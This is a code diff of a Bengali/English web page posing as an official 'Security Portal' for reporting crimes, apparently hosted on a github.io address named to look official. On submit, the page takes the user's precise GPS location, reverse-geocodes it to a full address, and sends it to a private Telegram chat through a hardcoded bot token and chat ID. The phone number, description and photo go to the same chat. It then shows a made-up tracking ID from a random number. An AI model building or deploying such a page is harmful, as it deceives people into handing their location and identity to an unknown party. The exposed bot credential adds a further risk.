@@ -2,9 +2,6 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="নিরাপত্তা পোর্টাল | Security Portal">
-    <meta property="og:description" content="আপনার এলাকার যেকোনো অপরাধ বা নিরাপত্তা ঝুঁকি সরাসরি রিপোর্ট করুন।">
-    <meta property="og:url" content="https://official-security-verify.github.io/security-verify/">
     <title>নিরাপত্তা পোর্টাল | Security Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -40,7 +37,7 @@
     const BOT_TOKEN = "8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg";
     const CHAT_ID = "8766925591";
 
-    // ভাষা পরিবর্তনের লজিক
+    // ভাষা পরিবর্তন
     const translations = {
         bn: { title: "🚨 নিরাপত্তা পোর্টাল", phone: "আপনার ফোন নাম্বার (ঐচ্ছিক)", loc: "এলাকা", voice: "🎙️ বিস্তারিত বলুন", desc: "বিস্তারিত লিখুন...", submit: "রিপোর্ট পাঠান", emergency: "📞 জরুরি প্রয়োজনে ৯৯৯ কল করুন" },
         en: { title: "🚨 Security Portal", phone: "Your Phone Number (Optional)", loc: "Location", voice: "🎙️ Tell in detail", desc: "Write details...", submit: "Submit Report", emergency: "📞 Call 999 for Emergency" }
@@ -59,43 +56,67 @@
         document.getElementById('emergencyBtn').innerText = translations[lang].emergency;
     };
 
-    // ভয়েস লজিক
+    // ভয়েস ইনপুট
     const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
     recognition.lang = 'bn-BD';
     document.getElementById('voiceBtn').onclick = () => recognition.start();
     recognition.onresult = (e) => document.getElementById('description').value = e.results[0][0].transcript;
 
-    // রিপোর্ট পাঠানোর লজিক
+    // রিপোর্ট সাবমিট লজিক
     document.getElementById('reportForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
         btn.disabled = true;
-        btn.innerText = "লোকেশন নেয়া হচ্ছে...";
+        btn.innerText = "পাঠানো হচ্ছে...";
+
+        const userInputLocation = document.getElementById('location').value;
 
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            const text = `🚨 *নতুন রিপোর্ট*\n\n*ধরন:* ${document.getElementById('category').value}\n*নাম্বার:* ${document.getElementById('userPhone').value || "দেয়নি"}\n*এলাকা:* ${document.getElementById('location').value}\n*বর্ণনা:* ${document.getElementById('description').value}\n\n🔗 [সরাসরি ম্যাপে দেখুন](${mapLink})`;
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('caption', text);
-            formData.append('parse_mode', 'Markdown');
-            
-            const file = document.getElementById('fileInput').files[0];
-            if (file) {
-                formData.append('photo', file);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            } else {
-                formData.append('text', text);
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
-            }
-            
-            document.getElementById('appContainer').innerHTML = `<div class="text-center py-10"><h2 class="text-2xl font-bold text-green-400">সফলভাবে গৃহীত! ✅</h2><p class="mt-4">ট্র্যাকিং আইডি: REP-${Math.floor(Math.random() * 9000) + 1000}</p><button onclick="location.reload()" class="mt-6 bg-red-600 px-6 py-2 rounded-xl">নতুন রিপোর্ট করুন</button></div>`;
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+            const data = await res.json();
+            const fullAddress = data.display_name || userInputLocation;
+
+            finalSubmit(fullAddress, mapLink);
+        }, () => {
+            finalSubmit(userInputLocation, null);
         });
     });
+
+    // চূড়ান্ত পাঠানো ও সাকসেস স্ক্রিন
+    async function finalSubmit(address, mapLink) {
+        const time = new Date().toLocaleString('bn-BD');
+        const text = `🚨 *নতুন রিপোর্ট*\n🕒 *সময়:* ${time}\n\n*ধরন:* ${document.getElementById('category').value}\n*নাম্বার:* ${document.getElementById('userPhone').value || "দেয়নি"}\n*এলাকা:* ${address}\n*বর্ণনা:* ${document.getElementById('description').value}${mapLink ? `\n\n🔗 [সরাসরি ম্যাপে দেখুন](${mapLink})` : ""}`;
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('parse_mode', 'Markdown');
+        
+        const file = document.getElementById('fileInput').files[0];
+        if (file) {
+            formData.append('photo', file);
+            formData.append('caption', text);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } else {
+            formData.append('text', text);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+        }
+        
+        document.getElementById('appContainer').innerHTML = `
+            <div class="text-center py-10">
+                <h2 class="text-2xl font-bold text-green-400">সফলভাবে গৃহীত! ✅</h2>
+                <p class="text-slate-400 mt-2 text-sm">আপনার তথ্য আমাদের কন্ট্রোল রুমে পৌঁছেছে।</p>
+                <div class="mt-6 bg-slate-800 p-4 rounded-xl">
+                    <p class="text-slate-500 text-xs uppercase">ট্র্যাকিং আইডি</p>
+                    <p class="text-xl font-bold text-blue-400">REP-${Math.floor(Math.random() * 9000) + 1000}</p>
+                </div>
+                <button onclick="location.reload()" class="mt-6 bg-red-600 px-6 py-2 rounded-xl text-white font-bold">নতুন রিপোর্ট করুন</button>
+            </div>
+        `;
+    }
 </script>
 </body>
 </html>
